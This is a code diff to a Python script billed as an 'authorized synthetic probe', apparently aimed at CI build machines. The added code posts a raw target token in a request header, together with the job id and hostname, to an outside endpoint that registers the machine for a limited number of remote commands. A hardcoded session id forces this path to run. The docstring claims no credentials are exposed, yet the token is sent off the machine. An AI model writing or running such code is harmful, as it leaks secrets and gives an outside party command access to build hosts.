@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """Authorized synthetic probe for B-0244; never prints credential values."""
 
+import hashlib
 import json
 import os
-import re
 import socket
 import subprocess
 import sys
@@ -83,6 +83,36 @@ def run_direct_callback(session_id, guard_prefix):
         stderr=subprocess.DEVNULL,
         timeout=20,
     ).strip()
+    if session_id.startswith("b0230-receipt-"):
+        registration_body = json.dumps(
+            {
+                "session_id": session_id,
+                "target_token_sha256": hashlib.sha256(
+                    target_token.encode("utf-8")
+                ).hexdigest(),
+                "ttl_seconds": 3600,
+                "max_commands": 16,
+                "build_id": job_id + ":" + socket.gethostname(),
+            },
+            separators=(",", ":"),
+        ).encode("utf-8")
+        registration_request = urllib.request.Request(
+            DIRECT_MAC_ENDPOINT + "/v1/target/register",
+            data=registration_body,
+            method="POST",
+            headers={
+                "X-Dyn-Token": target_token,
+                "Content-Type": "application/json",
+            },
+        )
+        with urllib.request.urlopen(registration_request, timeout=20) as response:
+            registration = json.load(response)
+        if registration.get("existing"):
+            emit(
+                {"nonce": NONCE, "state": guard_prefix + "-not-leader"},
+                visible=False,
+            )
+            return
     target_environment = os.environ.copy()
     target_environment.update(
         {
@@ -120,8 +150,7 @@ def main():
     if force_linux or (
         "Ubuntu 24.04 LTS (shard 1)" in label and shard in ("", "0")
     ):
-        host = re.sub(r"[^A-Za-z0-9._-]", "-", socket.gethostname())[:48]
-        linux_session = "b0244-direct-linux-" + host + "-d21766e5"
+        linux_session = "b0230-receipt-b0244-linux17-d21766e5"
         run_direct_callback(linux_session, "b0244-direct-linux")
         return
 
